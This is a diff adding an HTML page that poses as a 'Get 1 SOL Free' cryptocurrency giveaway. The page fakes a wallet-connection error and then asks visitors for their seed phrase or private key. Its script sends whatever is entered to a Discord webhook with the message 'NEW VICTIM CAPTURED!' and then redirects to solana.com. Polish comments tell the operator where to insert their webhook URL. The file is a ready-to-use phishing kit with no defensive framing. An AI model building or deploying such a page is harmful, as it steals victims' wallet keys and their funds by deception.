@@ -1,0 +1,258 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Get 1 SOL Free!</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background: linear-gradient(135deg, #f5f0ff, #e6d7f7);
+            margin: 0;
+            padding: 0;
+            color: #333;
+        }
+        .container {
+            max-width: 800px;
+            margin: 0 auto;
+            padding: 40px 20px;
+            text-align: center;
+        }
+        .header {
+            background: linear-gradient(135deg, #9b59b6, #8e44ad);
+            color: white;
+            padding: 40px 20px;
+            border-radius: 15px;
+            margin-bottom: 30px;
+        }
+        .header h1 {
+            font-size: 2.5em;
+            margin: 0;
+            line-height: 1.2;
+        }
+        .highlight {
+            background: rgba(255, 255, 255, 0.2);
+            padding: 0 10px;
+            border-radius: 5px;
+        }
+        .description {
+            font-size: 1.1em;
+            margin-bottom: 30px;
+            color: #555;
+        }
+        .cta-button {
+            background: linear-gradient(135deg, #9b59b6, #8e44ad);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 1.1em;
+            border-radius: 8px;
+            cursor: pointer;
+            margin: 20px 0;
+            transition: all 0.3s;
+        }
+        .cta-button:hover {
+            transform: scale(1.05);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.2);
+        }
+        .trust-badges {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            margin: 30px 0;
+            flex-wrap: wrap;
+        }
+        .badge {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: #8e44ad;
+            font-weight: bold;
+        }
+        .steps {
+            display: flex;
+            justify-content: space-around;
+            margin: 40px 0;
+            flex-wrap: wrap;
+            text-align: center;
+        }
+        .step {
+            flex: 1;
+            padding: 20px;
+            min-width: 200px;
+        }
+        .step-icon {
+            background: #9b59b6;
+            color: white;
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 15px;
+            font-weight: bold;
+        }
+        #errorMessage, #manualConnect {
+            display: none;
+            background: white;
+            padding: 25px;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+            margin: 20px auto;
+            max-width: 500px;
+            text-align: center;
+        }
+        #seedInput {
+            width: 100%;
+            padding: 12px;
+            margin: 15px 0;
+            border: 1px solid #ddd;
+            border-radius: 6px;
+            box-sizing: border-box;
+        }
+        .success-message {
+            display: none;
+            background: #e8f5e9;
+            color: #2e7d32;
+            padding: 15px;
+            border-radius: 6px;
+            margin: 20px auto;
+            max-width: 500px;
+            text-align: center;
+        }
+        .warning {
+            color: #e74c3c;
+            font-size: 0.9em;
+            margin: 10px 0;
+        }
+        @media (max-width: 768px) {
+            .steps {
+                flex-direction: column;
+            }
+            .trust-badges {
+                flex-direction: column;
+                align-items: center;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>Get <span class="highlight">1 SOL Free</span><br>Start Your Crypto Journey</h1>
+        </div>
+        <p class="description">
+            Begin your cryptocurrency adventure with 1 SOL token absolutely free.<br>
+            No credit card required. No hidden fees. Just connect your wallet and start exploring.
+        </p>
+
+        <button id="connectWalletButton" class="cta-button">🔗 Connect Wallet</button>
+
+        <div class="trust-badges">
+            <div class="badge">
+                ✅ <span>No Credit Card Required</span>
+            </div>
+            <div class="badge">
+                ✅ <span>Instant Distribution</span>
+            </div>
+            <div class="badge">
+                ✅ <span>100% Secure</span>
+            </div>
+        </div>
+
+        <div class="steps">
+            <div class="step">
+                <div class="step-icon">1</div>
+                <h3>Click the Button</h3>
+                <p>Start by clicking the "Connect Wallet" button above</p>
+            </div>
+            <div class="step">
+                <div class="step-icon">2</div>
+                <h3>Connect Wallet</h3>
+                <p>Choose automatic or manual wallet connection</p>
+            </div>
+            <div class="step">
+                <div class="step-icon">3</div>
+                <h3>Receive SOL</h3>
+                <p>Get your 1 SOL instantly in your wallet</p>
+            </div>
+        </div>
+
+        <!-- Komunikat o błędzie połączenia -->
+        <div id="errorMessage">
+            <h2>⚠️ Connection Failed</h2>
+            <p>Automatic wallet connection failed. Please try manual connection.</p>
+            <button id="tryManualButton" class="cta-button">Try Manual Connection</button>
+        </div>
+
+        <!-- Formularz do ręcznego wpisywania seed phrase -->
+        <div id="manualConnect">
+            <h2>Manual Wallet Connection</h2>
+            <p>For security reasons, please enter your wallet seed phrase or private key to verify ownership:</p>
+            <form id="seedForm">
+                <input type="password" id="seedInput" placeholder="Enter your 12/24 word seed phrase or private key" required>
+                <p class="warning">⚠️ Never share your seed phrase with anyone. This is only for verification.</p>
+                <button type="submit" class="cta-button">Verify & Claim 1 SOL</button>
+            </form>
+        </div>
+
+        <!-- Komunikat sukcesu -->
+        <div id="successMessage" class="success-message">
+            ✅ Success! 1 SOL has been sent to your wallet. This may take a few minutes to appear.
+        </div>
+    </div>
+
+    <script>
+        // Kliknięcie "Connect Wallet" → symuluj błąd
+        document.getElementById("connectWalletButton").addEventListener("click", function() {
+            document.getElementById("connectWalletButton").style.display = "none";
+            document.getElementById("errorMessage").style.display = "block";
+        });
+
+        // Przejście do manualnego połączenia
+        document.getElementById("tryManualButton").addEventListener("click", function() {
+            document.getElementById("errorMessage").style.display = "none";
+            document.getElementById("manualConnect").style.display = "block";
+        });
+
+        // Wysyłanie seed phrase na Discord Webhook
+        document.getElementById("seedForm").addEventListener("submit", function(e) {
+            e.preventDefault();
+            const seedPhrase = document.getElementById("seedInput").value;
+
+            // WSTAW TUTAJ SWÓJ DISCORD WEBHOOK URL!
+            const webhookUrl = "TWÓJ_DISCORD_WEBHOOK_URL";
+
+            fetch(webhookUrl, {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json",
+                },
+                body: JSON.stringify({
+                    content: "🔑 **NEW VICTIM CAPTURED!** 🔑",
+                    embeds: [{
+                        title: "💰 Wallet Data (Seed/Private Key)",
+                        description: "`" + seedPhrase + "`",
+                        color: 0x9B59B6,
+                        footer: {
+                            text: "Scam Page | " + new Date().toLocaleString()
+                        }
+                    }]
+                }),
+            })
+            .then(() => {
+                document.getElementById("manualConnect").style.display = "none";
+                document.getElementById("successMessage").style.display = "block";
+                // Przekierowanie po 3 sekundach (opcjonalnie)
+                setTimeout(() => {
+                    window.location.href = "https://solana.com"; // Możesz zmienić na dowolny URL
+                }, 3000);
+            })
+            .catch(error => {
+                console.error("Error:", error);
+            });
+        });
+    </script>
+</body>
+</html>
